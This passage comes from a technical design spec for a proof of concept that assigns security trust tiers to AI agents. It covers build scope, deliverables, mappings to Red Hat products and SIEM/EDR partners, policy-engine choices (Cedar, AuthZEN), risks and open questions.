- Revocation: short-lived tokens (5 min) + CAEP push. Phase 3 adds introspection.

### 7.4 Configuration Scaling

- Profile inheritance (narrow from parent, don't duplicate)
- Profile templates for quick onboarding
- Policy linting in CI ("no rule grants admin to non-Sovereign")
- Drift detection: compare active tokens vs profile definitions weekly

## 8. Implementation Scope — Phase 2.5

### 8.1 Build (new code, ~3-4 weeks)

| Component | Effort | Description |
|-----------|--------|-------------|
| Tier-aware OBO daemon | 3 days | IPA group lookup, scope ceiling from profile config, tier/profile claims |
| Policy sidecar | 1 week | Cedar binary, 5 rules, AuthZEN endpoint, fast-path filter |
| Target API | 3 days | Simulated incident management (5 endpoints), wired through L2→L3→L4→L5 |
| OpenShell tier profiles | 2 days | 4 profiles (blocked/sovereign/verified/untrusted), profile selector reads token tier claim |
| Blastwall SELinux modules | 3 days | 3 policy modules (sovereign/verified/untrusted), file contexts, MLS/MCS labels |
| Audit pipeline | 1.5 weeks | OCSF log formatter, anomaly detector (policy + behavioral), circuit breaker, intent signal stub, CAEP revocation stub |
| Demo harness | 3 days | 7-act script, 3 output modes (engineering/strategy/customer) |
| Assessment harness | 2 days | Static checks (cosign, blocklist) + OpenShell dynamic sandbox + scoring engine + synthetic API |
| Benchmark suite | 2 days | Policy latency + scale test (100/500/1000 concurrent agents) |

### 8.2 Reuse (existing code, extend)

- ahdapa + OBO daemon (add tier awareness)
- agentdesktop JWT enrollment (becomes DevAssist enrollment path)
- IPA groups + HBAC framework
- OpenShell 0.0.111 (add profile configs)
- Blastwall upstream PRs (SELinux policy framework)
- AB's DARC ahdapa implementation (wire into lab)

### 8.3 Mock (Phase 2.5 → real in Phase 3)

| Component | Phase 2.5 (mock) | Phase 3 (real) |
|-----------|-----------------|----------------|
| DARC SSSD flow | ahdapa HTTP endpoint | Full PA-152 v2 Kerberos |
| CAEP signal | HTTP POST stub | Full SSF/CAEP stream |
| SIEM dashboard | JSON log + `jq` queries | Grafana/Splunk integration |
| IPA policy objects | Config files | LDAP objectclass + IPA CLI |
| Attestation verification | Enrollment-path-derived claim | Keylime + SPIRE + cosign real evidence |
| Behavioral anomaly (semantic) | Action sequence only | LLM judge + drift baselines |
| EDA remediation | Webhook to stdout | EDA rulebook + AAP playbooks |
| Orchestrator intent | Manual curl registration | AAP/EDA auto-registration |
| Pre-enrollment assessment | Script + manual review | Automated pipeline with API submission + auto-tier assignment |
| Multi-site replication | Single site | IPA replication |

### 8.4 Infrastructure

**Primary:** Extend existing WID Beaker lab (primary + replica + client already provisioned).

- Add: Cedar sidecar container, target API, audit pipeline
- Deploy: AB's ahdapa DARC build alongside existing ahdapa

**Fallback:** Fresh Beaker job with Fedora 44 (ipacta in rawhide) if lab state too stale.

## 9. Deliverables

| # | Deliverable | Audience | Format |
|---|-------------|----------|--------|
| 1 | Test harness | Engineering | `tests/test-trust-tiers.sh` — automated assertions per layer |
| 2 | Benchmark suite | Engineering | `tests/bench-policy-latency.sh`, `tests/bench-scale.sh` |
| 3 | Architecture doc | Engineering | Repo markdown + GDoc |
| 4 | Executive pitch | Strategy | GDoc (done: `1V0yr...`) |
| 5 | CY27 Big Rocks slide update | Strategy | Google Slides |
| 6 | Competitive comparison table | Strategy | In executive pitch GDoc |
| 7 | 7-act narrated demo | Customer | `beaker/demo-trust-tiers.sh --customer` |
| 8 | Arcade (async viewing) | Customer | 7-act YAML + HTML on product-talks |
| 9 | One-pager | Customer | GDoc, trimmed from executive pitch |
| 10 | Assessment harness | Engineering | `scripts/assess-tool.sh` — static + dynamic vetting pipeline |
| 11 | Architecture animation | All | `2026-09-28-agentic-security-trust-tiers-animation.html` |

## 10. Relationship to Existing Work

### 10.1 Phase Mapping

| Prior Phase | Trust Tiers Coverage |
|-------------|---------------------|
| Phase 2 MVP #1: OAuth2-to-Kerberos bridge | L2 tier-aware OBO daemon |
| Phase 2 MVP #2: Agent identity lifecycle | L1 DARC enrollment per tier |
| Phase 2 MVP #3: Structured audit logging | L5 OCSF audit pipeline |
| Phase 2 MVP #4: Deny zones via HBAC | L3 policy engine + L2 scope ceiling |
| Phase 2.5 (new): Trust tiers integration | All five layers wired end-to-end |
| Phase 3: WIMSE policy engine | L3 full Cedar/OPA + IPA LDAP policy objects |

### 10.2 DARC Integration Points

- AB's DARC proposal (2026-09-27) provides L1 implementation
- `confirmation_required` per profile maps to DARC §4.7 AS policy
- `authorization_details` type `krb5_tgt` in Sovereign enrollment maps to DARC §6.6
- `confirmation_input=none` rejection for high-value scopes maps to DARC §4.2

### 10.3 WIMSE Alignment

- RFC 9396 `authorization_details` serves both DARC and WIMSE Phase 3 item #1
- AuthZEN PEP placement matches WIMSE research brief recommendation
- AIMS layers 1-5 covered by L1-L4; layers 6-8 covered by L5

### 10.4 Related PoCs

- IPA OAuth2 PoC (60/60 tests) — L2 foundation
- Workload Identity PoC (4/4 milestones) — SPIFFE/SPIRE + SVID-to-OAuth2 bridge, attestation chain
- agentdesktop (9/10 tests) — Verified enrollment path
- ipa-otpd routing (E2E working) — DARC B component
- Hub-spoke sovereignty — per-spoke tier policy
- UPS device code flow — DARC as long-term fix
- OpenShell ODIS — L4 sandbox profiles
- CC Validated Pattern (Azure) — Keylime + Trustee KBS, Sovereign attestation backend
- Security Requirements Paper — UC-8 supply chain (Sigstore → Keylime → SPIRE → IPA)

### 10.5 Security Ecosystem Partnerships

L5 emits OCSF-formatted events, making integration with EDR/SIEM/XDR platforms a standards-based exercise. Priority partnerships by strategic value:

**Tier 1 — Open source aligned (PoC-ready)**

| Partner | Integration Point | Value |
|---------|-------------------|-------|
| Elastic Security | OCSF → Elasticsearch ingestion. Elastic Agent on RHEL for host-level telemetry feeding L5 behavioral detector | Open source SIEM. Kibana dashboards for trust tier visibility. Closest to RH values |
| Falco (Sysdig) | eBPF runtime detection feeds L5 anomaly detector with syscall-level signals from L4 confinement layer | Cloud-native runtime security. Already popular in OpenShift. Validates L4 enforcement |
| Event-Driven Ansible | L5 OCSF webhook → EDA rulebook → remediation playbook. Circuit breaker Stage 2/3 triggers automated response | Internal RH. Closes the loop from detection to remediation without human intervention |

**Tier 2 — Enterprise EDR (customer credibility)**

| Partner | Integration Point | Value |
|---------|-------------------|-------|
| CrowdStrike Falcon | Falcon LogScale ingests OCSF events. CrowdStrike marketplace integration module for trust tier telemetry | Dominant EDR. Enterprise SOC teams already use it. Validates platform for regulated industries |
| SentinelOne Singularity | DataSet backend for OCSF event volume. Purple AI for automated investigation of L5 anomalies | Strong Linux agent. AI-driven investigation aligns with agentic security narrative |
| Splunk (Cisco) | Direct OCSF ingestion (co-founded the standard). Splunk SOAR for orchestrated response alongside EDA | Largest SIEM install base. OCSF co-creator — our format is their native language |

**Tier 3 — Standards and frameworks**

| Body | Alignment | Value |
|------|-----------|-------|
| OCSF Consortium | Contribute agent identity event schemas. Propose trust tier and delegation chain extensions to the standard | Shape the standard our L5 emits. Credibility with security ecosystem |
| MITRE ATT&CK | Map L5 behavioral anomaly patterns to ATT&CK techniques (T1078 credential access, T1021 lateral movement, T1567 exfiltration) | SOC teams evaluate detections by ATT&CK coverage. Makes our detection story actionable |
| OpenTelemetry | Bridge OCSF security events with OTel operational telemetry. Unified observability across security and ops | Single pane for security + performance. Grafana/Prometheus ecosystem |

**Recommendation:** Start with Elastic + EDA + Falco (all open source, all on RHEL). Pursue CrowdStrike as enterprise EDR partner for regulated customer credibility. OCSF output format means any SIEM can consume events without lock-in.

### 10.6 Red Hat Portfolio Integration

The five-layer stack maps to products across the Red Hat portfolio. Each layer has a natural portfolio touchpoint that extends the PoC toward productization.

**Identity and Access (L1 + L2)**

| Product | Integration | Layer |
|---------|-------------|-------|
| Red Hat IdM / FreeIPA | Trust tier groups (`agent-tier-sovereign`, etc.), agent role profiles in LDAP, HBAC rules for deny zones, OTP/PKINIT for DARC enrollment | L1, L2 |
| Red Hat SSO / Keycloak | OAuth2 AS for token issuance, OBO token exchange, CAEP revocation streams. Client policies per trust tier | L1, L2 |
| Red Hat Certificate System | Agent certificate issuance, Sigstore integration for supply chain verification in pre-enrollment assessment | L1, L0 |

**Policy and Governance (L3)**

| Product | Integration | Layer |
|---------|-------------|-------|
| Ansible Automation Platform | EDA rulebooks for L5 circuit breaker remediation. Playbooks for tier promotion/demotion. Bulk agent enrollment automation | L3, L5 |
| Red Hat Advanced Cluster Security (ACS) | Extend trust tier policy to containerized agent workloads on OpenShift. ACS admission control enforces tier-based deployment rules | L3, L4 |
| Red Hat Trusted Profile Analyzer (RHTPA) | SBOM analysis for pre-enrollment assessment (Layer 0). CVE scanning of agent dependencies feeds risk score | L0 |
| Red Hat Quay | Container image scanning and vulnerability analysis feeds L0 pre-enrollment risk score. Cosign signature verification before agent image pull. Registry policies restrict Untrusted agents to signed, scanned images only | L0 |
| Red Hat Service Mesh (Istio) | mTLS enforcement between agents per trust tier. Traffic policies: Untrusted agents cannot call Sovereign endpoints. AuthorizationPolicy maps to Cedar L3 decisions at network level | L2, L3 |

**Execution and Confinement (L4)**

| Product / Capability | Integration | Layer |
|---------|-------------|-------|
| Podman (rootless) | Agent execution runtime under OpenShell profiles. Rootless containers + user namespaces + SELinux = defense-in-depth confinement. Quadlet unit files per trust tier | L4 |
| RHEL (SELinux / Blastwall) | L4b mandatory access control. MLS/MCS labels per trust tier. Type enforcement policy modules per agent role | L4 |
| Image Mode (bootc) | Immutable, image-based RHEL. Agents cannot tamper with the host OS — the read-only filesystem prevents rootkit persistence and configuration drift. Trust tier confinement is baked into the OS image itself | L4 |
| Keylime | TPM-based remote host attestation. Verifies platform integrity at boot and continuously monitors for runtime tampering. Sovereign tier requires Keylime attestation; Untrusted hosts that fail attestation are blocked from agent enrollment | L0, L4 |
| Trustee (Confidential Computing) | TEE attestation for SEV-SNP and TDX workloads. Verifies that agent execution environments have not been tampered with. Sovereign-tier agents handling sensitive data require Trustee-verified TEE confinement | L0, L4 |
| Hardened UBI | Pre-scanned, FIPS-validated container base images. Agents built on Hardened UBI inherit a known-good, compliance-ready foundation. Feeds L0 pre-enrollment assessment — images not based on Hardened UBI get higher risk scores | L0, L4 |
| System Roles (Ansible) | Ansible roles that enforce crypto policies, SELinux modes, and certificate configuration per trust tier. Sovereign hosts get FIPS crypto + targeted SELinux; Untrusted get strict SELinux + limited certificate trust. Declarative, idempotent enforcement of confinement posture | L4 |
| OpenShift (Pod Security) | Trust tier → Pod Security Standard mapping. Sovereign = privileged, Verified = baseline, Untrusted = restricted, Blocked = not scheduled | L4 |
| Red Hat Device Edge / MicroShift | Trust tiers for edge agent fleets. Constrained environments where L4 confinement is critical (limited network, air-gapped) | L4 |

**Monitoring and Response (L5)**

| Product | Integration | Layer |
|---------|-------------|-------|
| Ansible Automation Platform (EDA) | Circuit breaker → EDA webhook → remediation rulebook → containment playbook. Automated tier demotion and token revocation | L5 |
| Red Hat Insights | Agent fleet health dashboard. Trust tier distribution, anomaly rates, circuit breaker frequency as Insights rules | L5 |
| OpenShift Logging + Observability | OCSF event pipeline via Vector/Loki. Correlation with cluster-level telemetry for containerized agents | L5 |
| OpenSCAP / Compliance as Code | STIG/CIS benchmark scans verify agent host confinement profiles match regulatory requirements. Automated compliance reports per trust tier. Maps Cedar policies to compliance controls | L4, L5 |
| RHEL AI / InstructLab | Fine-tune anomaly detection models on OCSF event streams for improved circuit breaker accuracy. RHEL AI itself enrolls as a managed agent — second meta-recursive proof point alongside Lightspeed | L5, All |

**Platform and Deployment**

| Product | Integration | Layer |
|---------|-------------|-------|
| Red Hat Satellite | Agent enrollment at scale. Trust tier assignment as host group policy. Content views per tier (Sovereign gets all repos, Untrusted gets minimal) | All |
| Image Builder (bootc) | Pre-baked agent confinement profiles in RHEL images. Sovereign image vs Untrusted image with different SELinux modules | L4 |
| Red Hat Trusted Application Pipeline (RHTAP) | CI/CD pipeline for agent software. Build-time signing (Sigstore/Tekton Chains) feeds L0 pre-enrollment supply chain check | L0 |

**AI-Assisted Management**

| Product | Integration | Layer |
|---------|-------------|-------|
| RHEL Lightspeed (Advisor) | Advisor rules flag agent packages missing signatures, known-vulnerable dependencies, or non-compliant crypto before enrollment. Trust tier health as Advisor recommendation category | L0, L5 |
| RHEL Lightspeed (Remediation) | Auto-generated remediation playbooks from circuit breaker events. Natural language querying of OCSF audit streams ("which agents triggered anomalies this week?") | L5 |
| RHEL Lightspeed (Meta-recursive) | Lightspeed itself enrolls as a Verified-tier agent, confined by OpenShell, subject to the same five-layer stack it helps manage. Proof that the platform handles AI-managing-AI | All |
| Lightspeed in Satellite | On-prem Lightspeed deployment where OCSF audit data and policy queries never leave customer network. Enables AI-assisted agent fleet management in air-gapped and sovereignty-constrained environments. Satellite Capsules extend trust tier policy to edge locations | All |

**Cross-portfolio story:** An agent built on Hardened UBI, scanned in Quay (CVE-clean, Cosign-signed) → built in RHTAP (SBOM'd, Tekton Chains attestation) → host integrity verified by Keylime (TPM attestation) and Trustee (TEE for confidential workloads) → deployed via Satellite to an Image Mode RHEL host (immutable OS) → enrolled via IdM/Keycloak with trust tier assignment → confined by Podman rootless + SELinux/Blastwall under OpenShell profiles → System Roles enforce crypto policies and SELinux modes per tier → mTLS-enforced via Service Mesh → monitored by Insights + OpenSCAP compliance scans → anomalies detected by RHEL AI-trained models → remediated by EDA → managed through Lightspeed natural language queries. Every layer maps to an existing product or feature set — 23 capabilities, zero new SKUs. Lightspeed and RHEL AI close the loop: they query audit data, train on OCSF streams, and themselves operate as managed agents — proving the platform handles AI-managing-AI. The PoC proves the integration points; productization extends them.

### 10.7 ahdapa Authorization Policy Evolution

ahdapa today operates at L1–L2 (credential issuance, OBO delegation, scope ceilings). Its architecture positions it for a natural evolution into agent-specific authorization policy management at L3, complementing rather than competing with Keycloak Authorization Services.

**Current policy-adjacent capabilities:**

| Capability | Layer | Policy Nature |
|------------|-------|---------------|
| Scope ceilings per trust tier | L2 | Coarse AuthZ — hard limits on requestable scopes |
| Consent decisions | L2 | Authorization gates — admin/user approval before delegation |
| Delegation narrowing rules | L2 | Chain-of-custody policy — each hop narrows, never widens |
| Trust tier assignment | L1 | Access classification — determines policy envelope |

**Planned policy extensions:**

| Extension | Description | Why ahdapa (not Keycloak) |
|-----------|-------------|---------------------------|
| Cedar policy embedding | Lightweight policy engine evaluates agent-specific rules at token exchange time. ~2ms eval, no Java stack. Formally verifiable policies | ahdapa holds trust tier + delegation context at decision time. Cedar is lightweight enough to embed without architectural overhead |
| AuthZEN PDP | Standard authorization API (IETF draft) — any service asks ahdapa "can agent X do Y on resource Z?" Returns structured decision with obligation/advice | WIMSE alignment (§10.8). ahdapa becomes the agent-aware Policy Decision Point. Keycloak remains the enterprise PDP |
| Delegation policy rules | Declarative rules: "Agent A can delegate to agent B only if B is same-or-higher tier, only for scopes S, only for duration T" | Keycloak does not model delegation chains. ahdapa owns this context end-to-end |
| Behavioral policy | Circuit breaker thresholds per tier. Anomaly-triggered tier demotion rules. Re-promotion criteria after cooldown | ahdapa knows the agent's identity + tier + delegation history. Policy and enforcement co-located |
| Resource registration | Agents declare protected resources. ahdapa evaluates access requests against tier-scoped policies | Lighter than UMA for agent-to-agent scenarios. No resource server registration ceremony |

**Architectural split — ahdapa vs Keycloak AuthZ:**

```
Domain                    │ ahdapa AuthZ              │ Keycloak AuthZ Services
──────────────────────────┼───────────────────────────┼──────────────────────────
Policy domain             │ Agent lifecycle           │ Enterprise resources
Subjects                  │ AI agents, delegation     │ Humans, services, agents
                          │ chains                    │
Decisions                 │ Enrollment, delegation,   │ Resource access, UMA,
                          │ scope ceiling, tier       │ RBAC, client policies
                          │ promotion/demotion        │
Policy language           │ Cedar (embedded)          │ JavaScript, time-based,
                          │                           │ aggregate, role-based
Weight                    │ ~2ms eval, SQLite,        │ Full Java stack,
                          │ systemd service           │ PostgreSQL
Integration               │ FreeIPA/Kerberos native   │ OIDC/SAML federation
Standards                 │ AuthZEN, RFC 8693,        │ UMA 2.0, OAuth2
                          │ RFC 8628                  │
```

No overlap: Keycloak answers "can user/agent X access enterprise resource Y?" ahdapa answers "can agent X enroll/delegate/escalate within the agent trust model?" Both feed L5 audit. Both enforce at every API call.

**Dependency:** WIMSE policy engine PoC (see §10.8 below) validates the AuthZEN PDP path. Cedar embedding is independent — can proceed with ahdapa's existing scope ceiling enforcement as the policy hook.

### 10.8 WIMSE / AuthZEN Alignment

The IETF WIMSE (Workload Identity in Multi-System Environments) working group defines workload identity tokens and inter-system trust. AuthZEN (Authorization API) standardizes the PDP interface. Together they provide the standards foundation for ahdapa's agent-specific AuthZ evolution:

- **WIMSE workload identity tokens** map naturally to agent trust tier credentials — the token carries tier, scope ceiling, and delegation chain claims
- **AuthZEN PDP API** gives any service a standard way to query ahdapa for agent authorization decisions
- **Policy Information Point (PIP)** — ahdapa aggregates context from IdM (tier membership), Keylime (host attestation), and OCSF audit (behavioral history) to inform policy decisions

PoC validation: see `project_wimse-policy-engine-poc-alignment-2026-09-24.md` for the five-layer + AuthZEN integration design.

## 11. Risks and Mitigations

| Risk | Impact | Mitigation |
|------|--------|------------|
| MIT krb5 callbacks not available (DARC Phase 2) | Consent page shows "anonymous armor" instead of host identity | Acceptable for Phase 2.5; host-armor is Phase 3 upgrade |
| Cedar sidecar complexity | Rust binary dependency on target API | Fallback: OPA (Go, single binary, wider ecosystem) |
| WID Beaker lab state too stale | Infra setup time | Fallback: fresh Beaker job with Fedora 44 |
| AB's DARC packaging not ready | Can't install DARC on lab | Use ahdapa HTTP endpoint directly (mock PA-152) |
| OpenShell 0.0.111 API changes | Profile integration breaks | Pin version; azaalouk engaged |

## 12. Open Questions

1. **Cedar vs OPA** — Cedar is faster and formally verifiable. OPA has wider ecosystem and CNCF backing. Recommend Cedar for PoC (performance story), evaluate OPA for productization.
2. **Profile storage** — Config files (Phase 2.5) vs IPA LDAP (Phase 3). When does AB add the LDAP objectclass?
3. **Anomaly detector sophistication** — Sliding window sufficient for PoC. ML-based behavioral analysis for Phase 3?
4. **CAEP integration** — Stub vs real. When does ahdapa get a proper revocation signal endpoint?
5. **Notification channel** — Alert to Sovereign agents on breach. Email? IPA doesn't have a notification framework today.

---

*Spec self-review complete. Fixed: (1) added `devops-assistant` profile so DevAssist has incident scopes matching demo scenario, (2) clarified `max-delegation-depth` counts sub-delegations initiated by the agent (not total chain depth), (3) corrected audit volume estimate at 5K agents. No TBDs or placeholders remain.*
